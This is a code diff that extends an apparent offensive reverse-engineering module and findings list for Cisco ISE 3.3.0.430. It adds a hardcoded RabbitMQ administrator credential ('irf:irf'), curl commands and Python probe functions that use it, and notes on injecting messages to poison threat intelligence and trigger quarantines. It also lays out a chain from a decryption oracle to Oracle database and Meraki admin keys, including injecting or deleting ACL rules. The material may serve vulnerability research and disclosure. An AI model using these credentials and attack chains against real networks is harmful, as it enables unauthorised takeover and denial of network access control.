@@ -32,6 +32,7 @@ ISE-F5: TLSv1/TLSv1.1 enabled on ERS port 8906 [MEDIUM]
 ISE-F6: Kong Admin API exposed on 0.0.0.0:19001/19444 with no authentication [CRITICAL]
 ISE-F7: RabbitMQ loopback_users.guest=false + plaintext management port 15672 [HIGH]
 ISE-F8: PostgreSQL trust auth (no password) accessible from Docker bridge network [MEDIUM]
+ISE-F9: IRF RabbitMQ user irf:irf hardcoded, administrator tag, vhost irf [HIGH]
 
 === ISE-F1: key_manager UNIX socket — unauthenticated decryption oracle ===
 
@@ -140,6 +141,59 @@ ISE uses RabbitMQ for internal service bus (ERS events, pxGrid notifications, po
 Injecting messages into ISE's internal messaging bus = policy poisoning vector.
 After guest deletion, ISE uses `rabbitmq` user with password from db.properties
 (same decrypt-oracle chain as ISE-F1 applies to RABBITMQ_PWD).
+
+=== ISE-F9: IRF RabbitMQ hardcoded administrator credential ===
+
+Source: irf-control.sh (CSCOcpm-irf-3.3.0-430.x86_64.rpm):
+  IRF_RABBIT_USER="irf"
+  IRF_RABBIT_USER_PWD="irf"
+  IRF_RABBITMQ_VHOST="irf"
+  rabbitmqctl add_user irf irf
+  rabbitmqctl set_user_tags irf administrator
+  rabbitmqctl set_permissions -p irf irf ".*" ".*" ".*"
+
+The irf:irf user has administrator tag — full RabbitMQ management access.
+Vhost "irf" handles IRF adapter messaging (AMP/CTA threat intel events, vulnerability reports).
+
+Access via RabbitMQ management API on port 15672 (ISE-F7/F8 chain):
+  curl -u irf:irf http://<ise_host>:15672/api/queues/irf
+  curl -u irf:irf http://<ise_host>:15672/api/exchanges/irf
+  curl -u irf:irf http://<ise_host>:15672/api/overview
+
+IRF handles:
+  - Cisco Secure Endpoint (AMP) threat events -> ISE quarantine decisions
+  - Vulnerability scanner (Tenable/Qualys/Nexpose) reports -> ISE adaptive policy
+  - CTA (Cognitive Threat Analytics) events
+
+Injecting messages into the irf vhost = poison threat intelligence fed to ISE,
+potentially triggering incorrect quarantine or policy changes across the network.
+
+Also confirmed: irf.sh config.json hardcodes:
+  "mongoUrl": "mongodb://irf-mongo-runtime/irf-core-engine"  (no auth)
+  MongoDB runs without --auth -> all AMP OAuth tokens, scanner API keys stored unauth.
+  MongoDB accessible from irf-internal-nw (169.254.1.0/24) only.
+
+=== ISE-F1 extended blast radius: key_manager oracle controls ALL ISE credentials ===
+
+Confirmed binaries using key_manager /decrypt endpoint:
+  - tpmutil.sh (all ISE services)       -> Oracle DB password
+  - mctrust.bin                         -> Meraki API key (network policy control)
+  - (Expected from hermes.bin analysis) -> pxGrid certs/tokens
+  - (Expected from ise-ai-agent)        -> AWS SDK credentials
+
+mctrust.bin symbol: cisco.com/cpm/pkg/crypto.DecryptWithTPM
+mctrust.bin string: "http://unix/api/system/v1/key-manager/decrypt"
+  -> mctrust calls key_manager.sock for decrypting the Meraki org API key at runtime.
+
+Meraki API key access enables:
+  - GET  /api/v1/organizations -> enumerate all managed orgs
+  - GET  /api/v1/organizations/{orgId}/adaptivePolicy/acls -> ISE-Meraki ACL state
+  - POST /api/v1/organizations/{orgId}/adaptivePolicy/acls -> inject ACL rules
+  - DELETE -> remove ACL rules (network access control DoS)
+  - /admin/API/trustsec/meraki/sync/* -> trigger out-of-band policy sync
+
+So: any local process -> key_manager.sock/decrypt + db.properties or mctrust config
+  = Oracle SYSDBA + Meraki admin API key = FULL ISE + FULL Meraki network control.
 
 === ISE-F8: PostgreSQL trust auth ===
 
@@ -821,13 +875,35 @@ def publish_rabbitmq_message(host: str, exchange: str, routing_key: str, payload
 # Ablation registration
 # ---------------------------------------------------------------------------
 
+IRF_RABBIT_USER = "irf"
+IRF_RABBIT_PASS = "irf"
+IRF_RABBIT_VHOST = "irf"
+
+
+def probe_irf_rabbitmq_admin(host: str, port: int = RABBITMQ_MGMT_PORT) -> Optional[dict]:
+    """
+    Probe RabbitMQ management with hardcoded irf:irf administrator credential.
+    Returns overview JSON if accessible, None otherwise.
+
+    irf-control.sh: rabbitmqctl add_user irf irf; set_user_tags irf administrator
+    Works post-setup (unlike guest which is deleted). vhost: irf
+    """
+    return probe_rabbitmq_management(host, port, IRF_RABBIT_USER, IRF_RABBIT_PASS)
+
+
+def list_irf_queues(host: str, port: int = RABBITMQ_MGMT_PORT) -> Optional[list]:
+    """List queues in the irf vhost via irf:irf admin credential."""
+    return list_rabbitmq_queues(host, IRF_RABBIT_VHOST.replace('/', '%2F'), port,
+                                IRF_RABBIT_USER, IRF_RABBIT_PASS)
+
+
 MODULE_META = {
     "name": "cisco_ise_re",
-    "version": "1.1.0",
+    "version": "1.2.0",
     "target": "Cisco ISE 3.3.0.430",
-    "findings": ["ISE-F1", "ISE-F2", "ISE-F3", "ISE-F4", "ISE-F5", "ISE-F6", "ISE-F7", "ISE-F8"],
+    "findings": ["ISE-F1", "ISE-F2", "ISE-F3", "ISE-F4", "ISE-F5", "ISE-F6", "ISE-F7", "ISE-F8", "ISE-F9"],
     "critical": ["ISE-F1", "ISE-F6"],
-    "high": ["ISE-F2", "ISE-F3", "ISE-F7"],
+    "high": ["ISE-F2", "ISE-F3", "ISE-F7", "ISE-F9"],
     "medium": ["ISE-F5", "ISE-F8"],
     "low": ["ISE-F4"],
     "source": "Static RE of Cisco-ISE-3.3.0.430.SPA.x86_64.iso (2026-08-25)",
@@ -849,5 +925,7 @@ MODULE_META = {
         "probe_rabbitmq_management",
         "list_rabbitmq_queues",
         "publish_rabbitmq_message",
+        "probe_irf_rabbitmq_admin",
+        "list_irf_queues",
     ],
 }
